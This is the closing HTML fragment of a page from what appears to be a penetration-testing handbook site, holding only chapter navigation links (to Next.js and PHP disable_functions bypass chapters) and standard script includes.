                            <a rel="prev" href="../../../network-services-pentesting/pentesting-web/nextjs-1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../network-services-pentesting/pentesting-web/nextjs-1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
